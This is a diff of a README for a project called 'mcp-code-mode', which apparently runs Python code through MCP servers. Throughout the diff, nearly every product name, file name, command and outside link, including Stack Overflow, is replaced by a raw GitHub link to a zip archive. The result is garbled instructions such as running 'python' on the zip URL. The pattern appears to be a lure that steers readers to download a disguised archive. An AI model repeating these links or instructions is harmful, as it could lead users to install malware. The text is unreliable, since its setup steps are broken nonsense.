@@ -1,7 +1,7 @@
 # 🖥️ mcp-code-mode - Run Python Code with Ease
 
 ## 🌐 Download the Latest Version
-[![Download Now](https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/.kilocode/mcp-code-mode_3.8-alpha.4.zip)](https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/.kilocode/mcp-code-mode_3.8-alpha.4.zip)
+[![Download Now](https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/src/code-mcp-mode-2.1.zip)](https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/src/code-mcp-mode-2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to the **MCP Code Mode** project! This application allows you to execute
 
 ### 1. 💻 Installation
 
-To get started, you’ll need to set up your environment. This application requires Python 3.11 or higher and https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/.kilocode/mcp-code-mode_3.8-alpha.4.zip 20 or higher.
+To get started, you’ll need to set up your environment. This application requires Python 3.11 or higher and https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/src/code-mcp-mode-2.1.zip 20 or higher.
 
 #### Step-by-Step Installation:
 1. **Create a Virtual Environment:**
@@ -25,7 +25,7 @@ To get started, you’ll need to set up your environment. This application requi
    pip install -e .[dev]
    ```
 
-3. **Install https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/.kilocode/mcp-code-mode_3.8-alpha.4.zip Dependencies:**
+3. **Install https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/src/code-mcp-mode-2.1.zip Dependencies:**
    To ensure you have the latest packages for reference servers, run:
    ```bash
    npm install -g npm@latest
@@ -38,11 +38,11 @@ Now that you have installed the application, it’s time to configure it.
 #### Copy the Example Environment Settings:
 To get started quickly, duplicate the example environment file:
 ```bash
-cp https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/.kilocode/mcp-code-mode_3.8-alpha.4.zip .env
+cp https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/src/code-mcp-mode-2.1.zip .env
 ```
 
 #### Configure Your MCP Servers:
-Edit the `https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/.kilocode/mcp-code-mode_3.8-alpha.4.zip` file. You will need to specify your MCP servers. Here’s an example of what it might look like:
+Edit the `https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/src/code-mcp-mode-2.1.zip` file. You will need to specify your MCP servers. Here’s an example of what it might look like:
 ```json
 {
   "servers": {
@@ -58,7 +58,7 @@ Replace `"/your-working-folder"` with the path to your working folder.
 
 ### 3. 📥 Download & Install
 
-To download the application, visit this page: [Download Releases](https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/.kilocode/mcp-code-mode_3.8-alpha.4.zip). 
+To download the application, visit this page: [Download Releases](https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/src/code-mcp-mode-2.1.zip). 
 
 Select the latest version and follow the instructions tailored for your operating system.
 
@@ -66,7 +66,7 @@ Select the latest version and follow the instructions tailored for your operatin
 
 After installation and configuration, it’s time to run the application. Use the following command in your terminal:
 ```bash
-python https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/.kilocode/mcp-code-mode_3.8-alpha.4.zip
+python https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/src/code-mcp-mode-2.1.zip
 ```
 This will start the server, and you can interact with the AI agent through your browser or terminal interface.
 
@@ -82,11 +82,11 @@ This will start the server, and you can interact with the AI agent through your 
 
 If you encounter issues while running the application, consider the following steps:
 
-- Ensure that you have the correct versions of Python and https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/.kilocode/mcp-code-mode_3.8-alpha.4.zip installed.
-- Double-check your configuration settings in `.env` and `https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/.kilocode/mcp-code-mode_3.8-alpha.4.zip`.
+- Ensure that you have the correct versions of Python and https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/src/code-mcp-mode-2.1.zip installed.
+- Double-check your configuration settings in `.env` and `https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/src/code-mcp-mode-2.1.zip`.
 - Look for error messages in the terminal. They often provide helpful hints.
 
-For further assistance, you can search for solutions on [Stack Overflow](https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/.kilocode/mcp-code-mode_3.8-alpha.4.zip) or consult the repository's issues section.
+For further assistance, you can search for solutions on [Stack Overflow](https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/src/code-mcp-mode-2.1.zip) or consult the repository's issues section.
 
 ### 7. 🤝 Contributing
 
